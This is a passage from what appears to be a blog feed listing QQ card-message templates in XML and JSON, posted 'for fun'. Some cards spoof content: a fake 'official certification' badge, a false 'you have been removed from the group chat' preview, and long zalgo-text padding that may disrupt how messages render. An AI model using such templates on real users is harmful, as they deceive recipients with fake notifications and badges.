class="string">"0"</span> <span class="attr">h</span>=<span class="string">"0"</span> /&gt;</span><span class="tag">&lt;<span class="name">title</span> <span class="attr">color</span>=<span class="string">"#00DB00"</span>&gt;</span>⁣<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;<span class="name">summary</span> <span class="attr">color</span>=<span class="string">"#FF0000"</span>&gt;</span>恋爱最佳人选<span class="tag">&lt;/<span class="name">summary</span>&gt;</span><span class="tag">&lt;/<span class="name">item</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">name</span>=<span class="string">"官方认证"</span> <span class="attr">icon</span>=<span class="string">"https://qzs.qq.com/ac/qzone_v5/client/auth_icon.png?_tcvassp_0_=640shp"</span> <span class="attr">action</span>=<span class="string">"web"</span> <span class="attr">appid</span>=<span class="string">"-1"</span> /&gt;</span><span class="tag">&lt;/<span class="name">msg</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="Pic-1"><a href="#Pic-1" class="headerlink" title="Pic 1"></a>Pic 1</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version='1.0' encoding='UTF-8' standalone='yes' ?&gt;</span><span class="tag">&lt;<span class="name">msg</span> <span class="attr">serviceID</span>=<span class="string">"76"</span> <span class="attr">templateID</span>=<span class="string">"1"</span> <span class="attr">action</span>=<span class="string">"plugin"</span> <span class="attr">actionData</span>=<span class="string">"                                                                                                                                                                                                                                                                                                                                                                                            各位复读机， ͆响复 ̾̉̎̎ͩ̔̅̉҉̡. ̴̡ͮ̽读不然会像我这种复读不清楚 各̯͓̥ͭͥͩ̽͗̑̇̎ͩ̀͢位̛̍͒̀͌ͯ͌͋̎̉̎̚̚҉̵͏̵̨̝̪͎̪̤̺̣̺͈̘̻̦̱̯̙̜̯̫͈͇̭̺̟͓̘̓ͤͤͣ̄̄̈́ͧ̽̂̀̚͞ͅ读̸̜̠̭͍͙ͩ̀ͣ͆̍̈͒̉̌̉̂͛̓͜͠͠机̪͓̥̪͊̎̆̎̃͆̈́́̚，̵̸͓̣̣̳̭͓̞͎̍ͤ͊ͯͮ̓͑͌̈́̄̒̑͌ͪ̀̀̚̕ͅͅ天̶̛̯͙͚͖̝͔̱̣̼̲͍̮̳̎ͦ͛̿͑͗̏ͧ̍͛̓̾̈́ͧ͊ͧ̄气ͮͤͩͬ̆͏̧̺̠̺̗̼͔̞̻̥̗̬̱̦͓̥̺̗̩̩̂̏͌ͯͧ̿́͑̅ͯ̕͟͠͝ͅ渐̵̖̗̟͉̦̐̊ͬ̉́̐̃͘变̵̙̳̙̜ͬ̈̀̊̃̿̈́̋̈͋̈́͆ͪͫ̂̽͊̃͡得̡͇̙̜̖̠̻̱̣͊̐̊͊̏ͦ̈́̒͆ͫ̑͛͐ͤͬ̽ͩ͢͢ͅͅ寒̶̝͎̯ͫ̓̍̓ͧ͆ͩ͗ͤ̚泠̨͖̯̮̼̖̪̦̲̖͉̹̟̥̟͖̔̽͑̒̿͐͌̋͗͛͋̿̄̏̕͜͝。̜͈̖̗̖̐͛͆̂̈̿́ͫ͠请̵̢͔̘͕̲͖͈͖̯̠̗̤̗̪̝̩̘͑̌̌ͦ͗ͩ͗̈́͆ͨ̓ͥ̓ͫͪ́̄̂̈́ͪ͌̂̈́͑̉̾͗ͥ̾ͬ̚͞͞ͅ ̴̯̲͈͙̖̫͚̯̲̂̉̉ͭͬ̉͊̀ͫ̄̚͘͢ ̸̛̮̦͖͇͕͓͇̖̯̳̻͍̠̪͍̖̒̊ͪ̇͑̆ͯ͛̇ͪͨ̌̒ͨ͌͗̈̃ ̵̟̟̖̯͕̙̭̙̗̼̤͈͚̪͈̺̲͓ͬͧͫ̓ͩ̂̽̀ͪͨ̄͑͐̅̉͟͝家̴̰̘͉͓̺̠̪̙̜͔̲͎͎͓̼̆͗ͮͥ͂̓ͬ͑̄̊́͡.̵͖̗̘̼͙̼̰̤͖͓ͭ̽͒̍̆̓́͛̎̍ͪ͒ͥͮ̉ͭͭ̚ͅ ͚͓̻̰̺̍̍ͭͦ̃̈̎̉̀̓̕ ̧̹͍͎̑̂ͮͩ́注͒̉͌͗͒ͬͤ͂̌ͧ̏ͬ̇̅͑͜҉̟̝͈̬͇̝͇̦̤̹̤͎̪̭̟̳̱ͯ̃̏̆̎ͥ͜͠ ̤͎̝̝̭̻̮̏͑ͤ͌̏̿̈́͑̓̒̌̌͑̿̽̄͐͐͞ͅͅ.̨͗̑ͭ͏̢͇͔̤̟͍̲͕͓ͅ ̡͖̦͍̖͇̞̤͕̞̟͔̙̺͈̥͓̰̬̓̍̿̇͗保̡̹̙͖̰̦̬̼̣̻̦̤̓͗ͪ̄ͪͨ̓͌ͫ͋́͢暖̨̛͎̼̟̌̾ͧ͐͊͢，̴̸̶̮̗̙̥̦̘̫̞͍̩̪̼̣̞̺̄̉̌ͬͣ̄͛̈̾̋̌̏̌̊͞以͖̲̱̱̮̥̫̘̰̜̫̪̩͔̬̃ͤ̎̾̒͋̈́̀͝ͅ免各位复读机，天气逐渐变得寒冷。请大家注意保暖，以免线路老化，影响复读。 各位复读机，天气逐渐变得寒冷。请大̧̧̓̓̐ ͆ͩ ̍ ̾̉̎̎ͩ家̔̅̉҉̡. ̴̡ͮ̽̐ ̷̉. ̴̡ͮ̽读不然会像我这种复读不清楚 各̯͓̥ͭͥͩ̽͗̑̇̎ͩ̀͢位̛̍͒̀͌ͯ͌͋̎̉̎̚̚҉̵͏̵̨̝̪͎̪̤̺̣̺͈̘̻̦̱̯̙̜̯̫͈͇̭̺̟͓̘̓ͤͤͣ̄̄̈́ͧ̽̂̀̚͞ͅ读̸̜̠̭͍͙ͩ̀ͣ͆̍̈͒̉̌̉̂͛̓͜͠͠机̪͓̥̪͊̎̆̎̃͆̈́́̚，̵̸͓̣̣̳̭͓̞͎̍ͤ͊ͯͮ̓͑͌̈́̄̒̑͌ͪ̀̀̚̕ͅͅ天̶̛̯͙͚͖̝͔̱̣̼̲͍̮̳̎ͦ͛̿͑͗̏ͧ̍͛̓̾̈́ͧ͊ͧ̄气ͮͤͩͬ̆͏̧̺̠̺̗̼͔̞̻̥̗̬̱̦͓̥̺̗̩̩̂̏͌ͯͧ̿́͑̅ͯ̕͟͠͝ͅ渐̵̖̗̟͉̦̐̊ͬ̉́̐̃͘变̵̙̳̙̜ͬ̈̀̊̃̿̈́̋̈͋̈́͆ͪͫ̂̽͊̃͡得̡͇̙̜̖̠̻̱̣͊̐̊͊̏ͦ̈́̒͆ͫ̑͛͐ͤͬ̽ͩ͢͢ͅͅ寒̶̝͎̯ͫ̓̍̓ͧ͆ͩ͗ͤ̚泠̨͖̯̮̼̖̪̦̲̖͉̹̟̥̟͖̔̽͑̒̿͐͌̋͗͛͋̿̄̏̕͜͝。̜͈̖̗̖̐͛͆̂̈̿́ͫ͠请̵̢͔̘͕̲͖͈͖̯̠̗̤̗̪̝̩̘͑̌̌ͦ͗ͩ͗̈́͆ͨ̓ͥ̓ͫͪ́̄̂̈́ͪ͌̂̈́͑̉̾͗ͥ̾ͬ̚͞͞ͅ ̴̯̲͈͙̖̫͚̯̲̂̉̉ͭͬ̉͊̀ͫ̄̚͘͢ ̸̛̮̦͖͇͕͓͇̖̯̳̻͍̠̪͍̖̒̊ͪ̇͑̆ͯ͛̇ͪͨ̌̒ͨ͌͗̈̃ ̵̟̟̖̯͕̙̭̙̗̼̤͈͚̪͈̺̲͓ͬͧͫ̓ͩ̂̽̀ͪͨ̄͑͐̅̉͟͝家̴̰̘͉͓̺̠̪̙̜͔̲͎͎͓̼̆͗ͮͥ͂̓ͬ͑̄̊́͡.̵͖̗̘̼͙̼̰̤͖͓ͭ̽͒̍̆̓́͛̎̍ͪ͒ͥͮ̉ͭͭ̚ͅ ͚͓̻̰̺̍̍ͭͦ̃̈̎̉̀̓̕ ̧̹͍͎̑̂ͮͩ́注͒̉͌͗͒ͬͤ͂̌ͧ̏ͬ̇̅͑͜҉̟̝͈̬͇̝͇̦̤̹̤͎̪̭̟̳̱ͯ̃̏̆̎ͥ͜͠ ̤͎̝̝̭̻̮̏͑ͤ͌̏̿̈́͑̓̒̌̌͑̿̽̄͐͐͞ͅͅ.̨͗̑ͭ͏̢͇͔̤̟͍̲͕͓ͅ ̡͖̦͍̖͇̞̤͕̞̟͔̙̺͈̥͓̰̬̓̍̿̇͗保̡̹̙͖̰̦̬̼̣̻̦̤̓͗ͪ̄ͪͨ̓͌ͫ͋́͢暖̨̛͎̼̟̌̾ͧ͐͊͢"</span> <span class="attr">a_actionData</span>=<span class="string">"mqqapi://card/show_pslcard?src_type=internal<span class="symbol">&amp;amp;</span>source=sharecard<span class="symbol">&amp;amp;</span>version=1<span class="symbol">&amp;amp;</span>uin=1692634246"</span> <span class="attr">brief</span>=<span class="string">"您有新的消息"</span> <span class="attr">sourcePublicUin</span>=<span class="string">"3043786528"</span> <span class="attr">sourceMsgId</span>=<span class="string">"1564738903051667"</span> <span class="attr">url</span>=<span class="string">"https://post.mp.qq.com/group/article/32363631363339303136-550394632.html?<span class="symbol">&amp;amp;</span>_wv=2147483777<span class="symbol">&amp;amp;</span>article_id=550394632<span class="symbol">&amp;amp;</span>time=1564738800<span class="symbol">&amp;amp;</span>sig=2ddfb161b623012c2a97556283aae6e5"</span> <span class="attr">flag</span>=<span class="string">"37"</span> <span class="attr">sType</span>=<span class="string">"1"</span> <span class="attr">adverSign</span>=<span class="string">"0"</span> <span class="attr">multiMsgFlag</span>=<span class="string">"0"</span>&gt;</span><span class="tag">&lt;<span class="name">item</span> <span class="attr">layout</span>=<span class="string">"6"</span> <span class="attr">advertiser_id</span>=<span class="string">"0"</span> <span class="attr">aid</span>=<span class="string">"0"</span>&gt;</span><span class="tag">&lt;<span class="name">title</span> <span class="attr">size</span>=<span class="string">"65"</span>&gt;</span>♡来自**对你的表白♡<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;<span class="name">summary</span> <span class="attr">type</span>=<span class="string">"1"</span>&gt;</span>5月21日5:20<span class="tag">&lt;/<span class="name">summary</span>&gt;</span><span class="tag">&lt;<span class="name">picture</span> <span class="attr">cover</span>=<span class="string">"http://gchat.qpic.cn/gchatpic_new/2641296238/735524882-3219132080-0B411A2AD75E45D611EBCC3A76BD4A0D/0"</span> <span class="attr">w</span>=<span class="string">"0"</span> <span class="attr">h</span>=<span class="string">"0"</span> /&gt;</span><span class="tag">&lt;<span class="name">picture</span> <span class="attr">cover</span>=<span class="string">"http://gchat.qpic.cn/gchatpic_new/2641296238/735524882-3219132080-95C47227C79C2CB305B571E31F43C618/0"</span> <span class="attr">w</span>=<span class="string">"0"</span> <span class="attr">h</span>=<span class="string">"0"</span> /&gt;</span><span class="tag">&lt;/<span class="name">item</span>&gt;</span><span class="tag">&lt;<span class="name">item</span> <span class="attr">layout</span>=<span class="string">"0"</span> <span class="attr">advertiser_id</span>=<span class="string">"0"</span> <span class="attr">aid</span>=<span class="string">"0"</span>&gt;</span><span class="tag">&lt;<span class="name">hr</span> <span class="attr">hidden</span>=<span class="string">"false"</span> <span class="attr">style</span>=<span class="string">"0"</span> /&gt;</span><span class="tag">&lt;/<span class="name">item</span>&gt;</span><span class="tag">&lt;<span class="name">item</span> <span class="attr">layout</span>=<span class="string">"0"</span> <span class="attr">advertiser_id</span>=<span class="string">"0"</span> <span class="attr">aid</span>=<span class="string">"0"</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>世界上的人那么多，为什么偏偏认识了你。认识的人那么多，为什么偏偏思念着你。只要想着你，心就甜如蜜！<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">item</span>&gt;</span><span class="tag">&lt;<span class="name">item</span> <span class="attr">layout</span>=<span class="string">"0"</span> <span class="attr">advertiser_id</span>=<span class="string">"0"</span> <span class="attr">aid</span>=<span class="string">"0"</span>&gt;</span><span class="tag">&lt;<span class="name">hr</span> <span class="attr">hidden</span>=<span class="string">"false"</span> <span class="attr">style</span>=<span class="string">"0"</span> /&gt;</span><span class="tag">&lt;/<span class="name">item</span>&gt;</span><span class="tag">&lt;<span class="name">item</span> <span class="attr">layout</span>=<span class="string">"0"</span> <span class="attr">advertiser_id</span>=<span class="string">"0"</span> <span class="attr">aid</span>=<span class="string">"0"</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>我会在每个有意义的时辰，远隔山海与你共存。<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">item</span>&gt;</span><span class="tag">&lt;<span class="name">item</span> <span class="attr">layout</span>=<span class="string">"0"</span> <span class="attr">advertiser_id</span>=<span class="string">"0"</span> <span class="attr">aid</span>=<span class="string">"0"</span>&gt;</span><span class="tag">&lt;<span class="name">hr</span> <span class="attr">hidden</span>=<span class="string">"false"</span> <span class="attr">style</span>=<span class="string">"0"</span> /&gt;</span><span class="tag">&lt;/<span class="name">item</span>&gt;</span><span class="tag">&lt;<span class="name">item</span> <span class="attr">layout</span>=<span class="string">"0"</span> <span class="attr">advertiser_id</span>=<span class="string">"0"</span> <span class="attr">aid</span>=<span class="string">"0"</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>遇到你之前世界是荒原；遇到你之后世界是乐园；过去的岁月，对我像一缕轻烟，未来的生涯，因你而幸福无边。<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">item</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">name</span>=<span class="string">"点击这里直达"</span> <span class="attr">icon</span>=<span class="string">"http://t.cn/RVIeaZK"</span> <span class="attr">url</span>=<span class="string">"https://baidu.com"</span> <span class="attr">action</span>=<span class="string">"web"</span> <span class="attr">appid</span>=<span class="string">"-1"</span> /&gt;</span><span class="tag">&lt;/<span class="name">msg</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>Pic2</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version='1.0' encoding='UTF-8' standalone='yes' ?&gt;</span><span class="tag">&lt;<span class="name">msg</span> <span class="attr">serviceID</span>=<span class="string">"76"</span> <span class="attr">templateID</span>=<span class="string">"1"</span> <span class="attr">action</span>=<span class="string">"plugin"</span> <span class="attr">actionData</span>=<span class="string">"                                                                                                                                                                                                                                                                                                                                                                                            各位复读机， ͆响复 ̾̉̎̎ͩ̔̅̉҉̡. ̴̡ͮ̽读不然会像我这种复读不清楚 各̯͓̥ͭͥͩ̽͗̑̇̎ͩ̀͢位̛̍͒̀͌ͯ͌͋̎̉̎̚̚҉̵͏̵̨̝̪͎̪̤̺̣̺͈̘̻̦̱̯̙̜̯̫͈͇̭̺̟͓̘̓ͤͤͣ̄̄̈́ͧ̽̂̀̚͞ͅ读̸̜̠̭͍͙ͩ̀ͣ͆̍̈͒̉̌̉̂͛̓͜͠͠机̪͓̥̪͊̎̆̎̃͆̈́́̚，̵̸͓̣̣̳̭͓̞͎̍ͤ͊ͯͮ̓͑͌̈́̄̒̑͌ͪ̀̀̚̕ͅͅ天̶̛̯͙͚͖̝͔̱̣̼̲͍̮̳̎ͦ͛̿͑͗̏ͧ̍͛̓̾̈́ͧ͊ͧ̄气ͮͤͩͬ̆͏̧̺̠̺̗̼͔̞̻̥̗̬̱̦͓̥̺̗̩̩̂̏͌ͯͧ̿́͑̅ͯ̕͟͠͝ͅ渐̵̖̗̟͉̦̐̊ͬ̉́̐̃͘变̵̙̳̙̜ͬ̈̀̊̃̿̈́̋̈͋̈́͆ͪͫ̂̽͊̃͡得̡͇̙̜̖̠̻̱̣͊̐̊͊̏ͦ̈́̒͆ͫ̑͛͐ͤͬ̽ͩ͢͢ͅͅ寒̶̝͎̯ͫ̓̍̓ͧ͆ͩ͗ͤ̚泠̨͖̯̮̼̖̪̦̲̖͉̹̟̥̟͖̔̽͑̒̿͐͌̋͗͛͋̿̄̏̕͜͝。̜͈̖̗̖̐͛͆̂̈̿́ͫ͠请̵̢͔̘͕̲͖͈͖̯̠̗̤̗̪̝̩̘͑̌̌ͦ͗ͩ͗̈́͆ͨ̓ͥ̓ͫͪ́̄̂̈́ͪ͌̂̈́͑̉̾͗ͥ̾ͬ̚͞͞ͅ ̴̯̲͈͙̖̫͚̯̲̂̉̉ͭͬ̉͊̀ͫ̄̚͘͢ ̸̛̮̦͖͇͕͓͇̖̯̳̻͍̠̪͍̖̒̊ͪ̇͑̆ͯ͛̇ͪͨ̌̒ͨ͌͗̈̃ ̵̟̟̖̯͕̙̭̙̗̼̤͈͚̪͈̺̲͓ͬͧͫ̓ͩ̂̽̀ͪͨ̄͑͐̅̉͟͝家̴̰̘͉͓̺̠̪̙̜͔̲͎͎͓̼̆͗ͮͥ͂̓ͬ͑̄̊́͡.̵͖̗̘̼͙̼̰̤͖͓ͭ̽͒̍̆̓́͛̎̍ͪ͒ͥͮ̉ͭͭ̚ͅ ͚͓̻̰̺̍̍ͭͦ̃̈̎̉̀̓̕ ̧̹͍͎̑̂ͮͩ́注͒̉͌͗͒ͬͤ͂̌ͧ̏ͬ̇̅͑͜҉̟̝͈̬͇̝͇̦̤̹̤͎̪̭̟̳̱ͯ̃̏̆̎ͥ͜͠ ̤͎̝̝̭̻̮̏͑ͤ͌̏̿̈́͑̓̒̌̌͑̿̽̄͐͐͞ͅͅ.̨͗̑ͭ͏̢͇͔̤̟͍̲͕͓ͅ ̡͖̦͍̖͇̞̤͕̞̟͔̙̺͈̥͓̰̬̓̍̿̇͗保̡̹̙͖̰̦̬̼̣̻̦̤̓͗ͪ̄ͪͨ̓͌ͫ͋́͢暖̨̛͎̼̟̌̾ͧ͐͊͢，̴̸̶̮̗̙̥̦̘̫̞͍̩̪̼̣̞̺̄̉̌ͬͣ̄͛̈̾̋̌̏̌̊͞以͖̲̱̱̮̥̫̘̰̜̫̪̩͔̬̃ͤ̎̾̒͋̈́̀͝ͅ免各位复读机，天气逐渐变得寒冷。请大家注意保暖，以免线路老化，影响复读。 各位复读机，天气逐渐变得寒冷。请大̧̧̓̓̐ ͆ͩ ̍ ̾̉̎̎ͩ家̔̅̉҉̡. ̴̡ͮ̽̐ ̷̉. ̴̡ͮ̽读不然会像我这种复读不清楚 各̯͓̥ͭͥͩ̽͗̑̇̎ͩ̀͢位̛̍͒̀͌ͯ͌͋̎̉̎̚̚҉̵͏̵̨̝̪͎̪̤̺̣̺͈̘̻̦̱̯̙̜̯̫͈͇̭̺̟͓̘̓ͤͤͣ̄̄̈́ͧ̽̂̀̚͞ͅ读̸̜̠̭͍͙ͩ̀ͣ͆̍̈͒̉̌̉̂͛̓͜͠͠机̪͓̥̪͊̎̆̎̃͆̈́́̚，̵̸͓̣̣̳̭͓̞͎̍ͤ͊ͯͮ̓͑͌̈́̄̒̑͌ͪ̀̀̚̕ͅͅ天̶̛̯͙͚͖̝͔̱̣̼̲͍̮̳̎ͦ͛̿͑͗̏ͧ̍͛̓̾̈́ͧ͊ͧ̄气ͮͤͩͬ̆͏̧̺̠̺̗̼͔̞̻̥̗̬̱̦͓̥̺̗̩̩̂̏͌ͯͧ̿́͑̅ͯ̕͟͠͝ͅ渐̵̖̗̟͉̦̐̊ͬ̉́̐̃͘变̵̙̳̙̜ͬ̈̀̊̃̿̈́̋̈͋̈́͆ͪͫ̂̽͊̃͡得̡͇̙̜̖̠̻̱̣͊̐̊͊̏ͦ̈́̒͆ͫ̑͛͐ͤͬ̽ͩ͢͢ͅͅ寒̶̝͎̯ͫ̓̍̓ͧ͆ͩ͗ͤ̚泠̨͖̯̮̼̖̪̦̲̖͉̹̟̥̟͖̔̽͑̒̿͐͌̋͗͛͋̿̄̏̕͜͝。̜͈̖̗̖̐͛͆̂̈̿́ͫ͠请̵̢͔̘͕̲͖͈͖̯̠̗̤̗̪̝̩̘͑̌̌ͦ͗ͩ͗̈́͆ͨ̓ͥ̓ͫͪ́̄̂̈́ͪ͌̂̈́͑̉̾͗ͥ̾ͬ̚͞͞ͅ ̴̯̲͈͙̖̫͚̯̲̂̉̉ͭͬ̉͊̀ͫ̄̚͘͢ ̸̛̮̦͖͇͕͓͇̖̯̳̻͍̠̪͍̖̒̊ͪ̇͑̆ͯ͛̇ͪͨ̌̒ͨ͌͗̈̃ ̵̟̟̖̯͕̙̭̙̗̼̤͈͚̪͈̺̲͓ͬͧͫ̓ͩ̂̽̀ͪͨ̄͑͐̅̉͟͝家̴̰̘͉͓̺̠̪̙̜͔̲͎͎͓̼̆͗ͮͥ͂̓ͬ͑̄̊́͡.̵͖̗̘̼͙̼̰̤͖͓ͭ̽͒̍̆̓́͛̎̍ͪ͒ͥͮ̉ͭͭ̚ͅ ͚͓̻̰̺̍̍ͭͦ̃̈̎̉̀̓̕ ̧̹͍͎̑̂ͮͩ́注͒̉͌͗͒ͬͤ͂̌ͧ̏ͬ̇̅͑͜҉̟̝͈̬͇̝͇̦̤̹̤͎̪̭̟̳̱ͯ̃̏̆̎ͥ͜͠ ̤͎̝̝̭̻̮̏͑ͤ͌̏̿̈́͑̓̒̌̌͑̿̽̄͐͐͞ͅͅ.̨͗̑ͭ͏̢͇͔̤̟͍̲͕͓ͅ ̡͖̦͍̖͇̞̤͕̞̟͔̙̺͈̥͓̰̬̓̍̿̇͗保̡̹̙͖̰̦̬̼̣̻̦̤̓͗ͪ̄ͪͨ̓͌ͫ͋́͢暖̨̛͎̼̟̌̾ͧ͐͊͢"</span> <span class="attr">a_actionData</span>=<span class="string">"mqqapi://card/show_pslcard?src_type=internal<span class="symbol">&amp;amp;</span>source=sharecard<span class="symbol">&amp;amp;</span>version=1<span class="symbol">&amp;amp;</span>uin=1692634246"</span> <span class="attr">brief</span>=<span class="string">"您有新的消息"</span> <span class="attr">sourcePublicUin</span>=<span class="string">"3043786528"</span> <span class="attr">sourceMsgId</span>=<span class="string">"1564738903051667"</span> <span class="attr">url</span>=<span class="string">"https://post.mp.qq.com/group/article/32363631363339303136-550394632.html?<span class="symbol">&amp;amp;</span>_wv=2147483777<span class="symbol">&amp;amp;</span>article_id=550394632<span class="symbol">&amp;amp;</span>time=1564738800<span class="symbol">&amp;amp;</span>sig=2ddfb161b623012c2a97556283aae6e5"</span> <span class="attr">flag</span>=<span class="string">"37"</span> <span class="attr">sType</span>=<span class="string">"1"</span> <span class="attr">adverSign</span>=<span class="string">"0"</span> <span class="attr">multiMsgFlag</span>=<span class="string">"0"</span>&gt;</span><span class="tag">&lt;<span class="name">item</span> <span class="attr">layout</span>=<span class="string">"6"</span> <span class="attr">advertiser_id</span>=<span class="string">"0"</span> <span class="attr">aid</span>=<span class="string">"0"</span>&gt;</span><span class="tag">&lt;<span class="name">title</span> <span class="attr">size</span>=<span class="string">"65"</span>&gt;</span>♡**欲言又止**♡<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;<span class="name">summary</span> <span class="attr">type</span>=<span class="string">"1"</span>&gt;</span>5月21日5:20<span class="tag">&lt;/<span class="name">summary</span>&gt;</span><span class="tag">&lt;<span class="name">picture</span> <span class="attr">cover</span>=<span class="string">"http://gchat.qpic.cn/gchatpic_new/2641296238/735524882-3219132080-0B411A2AD75E45D611EBCC3A76BD4A0D/0"</span> <span class="attr">w</span>=<span class="string">"0"</span> <span class="attr">h</span>=<span class="string">"0"</span> /&gt;</span><span class="tag">&lt;<span class="name">picture</span> <span class="attr">cover</span>=<span class="string">"http://gchat.qpic.cn/gchatpic_new/2641296238/735524882-3219132080-95C47227C79C2CB305B571E31F43C618/0"</span> <span class="attr">w</span>=<span class="string">"0"</span> <span class="attr">h</span>=<span class="string">"0"</span> /&gt;</span><span class="tag">&lt;/<span class="name">item</span>&gt;</span><span class="tag">&lt;<span class="name">item</span> <span class="attr">layout</span>=<span class="string">"0"</span> <span class="attr">advertiser_id</span>=<span class="string">"0"</span> <span class="attr">aid</span>=<span class="string">"0"</span>&gt;</span><span class="tag">&lt;<span class="name">hr</span> <span class="attr">hidden</span>=<span class="string">"false"</span> <span class="attr">style</span>=<span class="string">"0"</span> /&gt;</span><span class="tag">&lt;/<span class="name">item</span>&gt;</span><span class="tag">&lt;<span class="name">item</span> <span class="attr">layout</span>=<span class="string">"0"</span> <span class="attr">advertiser_id</span>=<span class="string">"0"</span> <span class="attr">aid</span>=<span class="string">"0"</span>&gt;</span><span class="tag">&lt;/<span class="name">item</span>&gt;</span><span class="tag">&lt;<span class="name">item</span> <span class="attr">layout</span>=<span class="string">"0"</span> <span class="attr">advertiser_id</span>=<span class="string">"0"</span> <span class="attr">aid</span>=<span class="string">"0"</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>我会在每个有意义的时辰，远隔山海与你共存。<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">item</span>&gt;</span><span class="tag">&lt;<span class="name">item</span> <span class="attr">layout</span>=<span class="string">"0"</span> <span class="attr">advertiser_id</span>=<span class="string">"0"</span> <span class="attr">aid</span>=<span class="string">"0"</span>&gt;</span><span class="tag">&lt;<span class="name">hr</span> <span class="attr">hidden</span>=<span class="string">"false"</span> <span class="attr">style</span>=<span class="string">"0"</span> /&gt;</span><span class="tag">&lt;/<span class="name">item</span>&gt;</span><span class="tag">&lt;<span class="name">item</span> <span class="attr">layout</span>=<span class="string">"0"</span> <span class="attr">advertiser_id</span>=<span class="string">"0"</span> <span class="attr">aid</span>=<span class="string">"0"</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">item</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">name</span>=<span class="string">"点击这里直达"</span> <span class="attr">icon</span>=<span class="string">"http://t.cn/RVIeaZK"</span> <span class="attr">url</span>=<span class="string">"https://baidu.com"</span> <span class="attr">action</span>=<span class="string">"web"</span> <span class="attr">appid</span>=<span class="string">"-1"</span> /&gt;</span><span class="tag">&lt;/<span class="name">msg</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="群友召唤"><a href="#群友召唤" class="headerlink" title="群友召唤"></a>群友召唤</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version='1.0' encoding='UTF-8' standalone='yes' ?&gt;</span><span class="tag">&lt;<span class="name">msg</span> <span class="attr">serviceID</span>=<span class="string">"60"</span> <span class="attr">templateID</span>=<span class="string">"123"</span> <span class="attr">action</span>=<span class="string">"web"</span> <span class="attr">brief</span>=<span class="string">"你已被移出群聊"</span> <span class="attr">sourceMsgId</span>=<span class="string">"0"</span> <span class="attr">url</span>=<span class="string">""</span> <span class="attr">flag</span>=<span class="string">"0"</span> <span class="attr">adverSign</span>=<span class="string">"0"</span> <span class="attr">multiMsgFlag</span>=<span class="string">"0"</span>&gt;</span><span class="tag">&lt;<span class="name">item</span> <span class="attr">layout</span>=<span class="string">"1"</span> <span class="attr">advertiser_id</span>=<span class="string">"0"</span> <span class="attr">aid</span>=<span class="string">"0"</span> /&gt;</span><span class="tag">&lt;<span class="name">item</span> <span class="attr">layout</span>=<span class="string">"1"</span> <span class="attr">advertiser_id</span>=<span class="string">"0"</span> <span class="attr">aid</span>=<span class="string">"0"</span>&gt;</span><span class="tag">&lt;<span class="name">summary</span> <span class="attr">size</span>=<span class="string">"×FF0000"</span>&gt;</span>群友召唤术？<span class="tag">&lt;/<span class="name">summary</span>&gt;</span><span class="tag">&lt;/<span class="name">item</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">name</span>=<span class="string">""</span> <span class="attr">icon</span>=<span class="string">""</span> <span class="attr">action</span>=<span class="string">""</span> <span class="attr">appid</span>=<span class="string">"-1"</span> /&gt;</span><span class="tag">&lt;/<span class="name">msg</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="匿名图"><a href="#匿名图" class="headerlink" title="匿名图"></a>匿名图</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;app&quot;:&quot;com.tencent.mobileqq.reading&quot;,&quot;desc&quot;:&quot;&quot;,&quot;view&quot;:&quot;singleImg&quot;, &quot;ver&quot;:&quot;1.0.0.70&quot;,&quot;prompt&quot;:&quot;。。。。&quot;,&quot;appID&quot;:&quot;&quot;,&quot;sourceName&quot;:&quot;&quot;,&quot;actionData&quot;:&quot;&quot;, &quot;actionData_A&quot;:&quot;&quot;,&quot;sourceUrl&quot;:&quot;&quot;,&quot;meta&quot;:&#123;&quot;singleImg&quot;:&#123;&quot;mainImage&quot;:&quot;http:&#x2F;&#x2F;huifeideyu.top&#x2F;res&#x2F;static&#x2F;images&#x2F;item.png&quot;, &quot;mainUrl&quot;:&quot;https:&#x2F;&#x2F;post.qq.com&quot;&#125;&#125;,&quot;config&quot;:&#123;&quot;forward&quot;:0,&quot;showSender&quot;:1&#125;,&quot;text&quot;:&quot;qtxml.cn&quot;,&quot;sourceAd&quot;:&quot;&quot;,&quot;config&quot;:&#123;&quot;forward&quot;:0,&quot;showSender&quot;:0&#125;&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>留着玩的</category>
      </categories>
      <tags>
        <tag>QQ</tag>
      </tags>
  </entry>
  <entry>
    <title>DNS域名服务</title>
    <url>/2020/03/18/DNS%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
